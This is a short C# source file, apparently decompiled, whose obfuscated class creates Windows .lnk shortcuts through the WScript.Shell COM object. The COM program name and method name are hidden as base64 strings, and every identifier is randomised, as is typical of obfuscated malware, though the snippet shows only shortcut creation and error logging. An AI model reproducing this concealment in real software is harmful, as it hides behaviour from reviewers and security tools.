using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace dfbDZtGQEYGzK;

public class iIRJTxOmFBmo
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface OPUnapQdgXFJxu
	{
		[DispId(0)]
		string njUkjQiqxPUu
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string nVFCsUngPGJZXn
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string WFMDkQlKbYxvWSM
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string qchSsBVBKEFw
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string ySvxntsWcKYrjT
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string jnubhblGWQ
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string kpNlLQrlPl
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int uxdgGtaPQR
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string vBhvLiMZKR
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[TypeLibFunc(64)]
		[DispId(2000)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type TZwOErsXzxM = Type.GetTypeFromProgID(sWSXzQkxHH.agZtqMkMayfivgE("V1NjcmlwdC5TaGVsbA=="));

	private static object CElZHOGJJXC = Activator.CreateInstance(TZwOErsXzxM);

	public static void PuXzjaLIEasSjuh(string azLuSHAmxsJcZFB, string GkyvMAYnteR, string uaqVDmxgcQW, string HcPCNWFnRHK, string tHIeCFyUNjhinWai, string mBaEZpQHGiY, string QNfIXAgzEYfWTM)
	{
		try
		{
			OPUnapQdgXFJxu oPUnapQdgXFJxu = (OPUnapQdgXFJxu)TZwOErsXzxM.InvokeMember(sWSXzQkxHH.agZtqMkMayfivgE("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, CElZHOGJJXC, new object[1] { azLuSHAmxsJcZFB });
			oPUnapQdgXFJxu.WFMDkQlKbYxvWSM = tHIeCFyUNjhinWai;
			oPUnapQdgXFJxu.qchSsBVBKEFw = mBaEZpQHGiY;
			oPUnapQdgXFJxu.kpNlLQrlPl = GkyvMAYnteR;
			oPUnapQdgXFJxu.vBhvLiMZKR = HcPCNWFnRHK;
			oPUnapQdgXFJxu.nVFCsUngPGJZXn = uaqVDmxgcQW;
			if (!string.IsNullOrEmpty(QNfIXAgzEYfWTM))
			{
				oPUnapQdgXFJxu.ySvxntsWcKYrjT = QNfIXAgzEYfWTM;
			}
			oPUnapQdgXFJxu.Save();
		}
		catch (Exception ex)
		{
			if (sWSXzQkxHH.bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(sWSXzQkxHH.SlCyjezmzcjRF, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
